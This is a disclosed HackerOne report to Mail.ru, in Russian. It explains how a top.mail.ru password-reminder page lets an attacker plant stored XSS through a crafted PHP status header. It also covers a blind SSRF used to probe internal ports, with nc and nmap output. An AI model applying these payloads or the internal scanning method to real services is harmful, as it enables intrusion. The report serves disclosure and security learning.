@@ -1,0 +1,58 @@
+ReportLink:https://hackerone.com/reports/11919
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/4lemon
+ReportedTo:Mail.ru(mailru)
+BountyAmount:300.0
+Severity:
+State:Closed
+DateOfDisclosure:10.01.2015 10:12:21
+
+Summary:
+
+Хотя http://top.mail.ru пока что и не в основном скопе, но уязвимость интересная. Поэтому шлю сразу, не ждя, когда этот проект будет в скопе.
+Итак, регистрируем счётчик для своего домена. И "забываем" пароль. Идём на восстановление пароля. В обычной ситуации это скорее всего выглядит вот так:
+http://top.mail.ru/passremind?id=1
+Или вот так - файл с мылом на месте:
+http://top.mail.ru/passremind?id=2
+
+Сразу возникли подозрения по поводу второго пункта:
+на адрес e-mail, указанный в файле top.mail.ru-1.txt, находящемся в корневом каталоге вашего сайта. Для этого создайте текстовый файл с названием top.mail.ru-1.txt, поместите в него адрес вашей электронной почты и запишите этот файл в корневой каталог вашего сайта: не удается получить указанный файл (404 Not Found)
+
+Во-первых, тут возможно SSRF в том или ином виде (более подробно ниже). О всех прелестях этого вектора отлично расписано вот тут: https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit?pli=1#
+
+Во-вторых, уж больно подозрительно выглядит строчка: (404 Not Found) - если это ответ сервера напрямую выведенный на страницу, почему бы не попробовать его подменить.
+Сказано, сделано:
+http://top.mail.ru/passremind?id=2516121
+
+Payload простейший:
+<?.
+header("Status: 404 <img src=x onerror='alert(/xss/)'>");
+?>
+
+Хранимый XSS, работающий как у авторизованного пользователя, так и не авторизованного. 
+
+Вернёмся к Server-side Request Forgery. Тесты показали, что:
+- запросы идут с сервера 217.69.136.185 - это сам top.mail.ru
+nc -vvv -l 6666
+Connection from 217.69.136.185 port 6666 [tcp/ircu-2] accepted
+- Follow location не отключено - возможность переадресации - для атакующего это хорошо.
+- большинство wrapper'ов отключено - для атакующего это плохо. Выглядит это так:
+ Protocol scheme 'imap' is not supported
+- не отключен wrapper data:// - практического применения это никакого не даёт. Но как факт.
+- Кроме этого SSRF "слепой" - в случае если ресурс, который запрашивался, существует, то тогда скрипт пытается достать от туда  почтовый адрес по маске. И если нет такого, то просто пишет:
+"адресов e-mail в указанном файле не найдено"
+
+В итоге, наиболее очевидное применение - это сканирование сети в к контексте данного сервера:
+header("Location: http://localhost/"); - "адресов e-mail в указанном файле не найдено" - доступно
+header("Location: http://localhost:3306/"); - "адресов e-mail в указанном файле не найдено" - доступно
+header("Location: http://localhost:3307/"); - "не удается получить указанный файл (500 Can't connect to localhost:3307 (connect: Connection refused))" - недоступно.
+При этом из внешней подсети никакого mysql не видно:
+nmap top.mail.ru
+Starting Nmap 5.51 ( http://nmap.org ) at 2014-05-13 14:30 MSK
+Nmap scan report for top.mail.ru (217.69.136.185)
+Host is up (0.059s latency).
+rDNS record for 217.69.136.185: galileo2.p.mail.ru
+Not shown: 998 filtered ports
+PORT    STATE SERVICE
+80/tcp  open  http
+443/tcp open  https
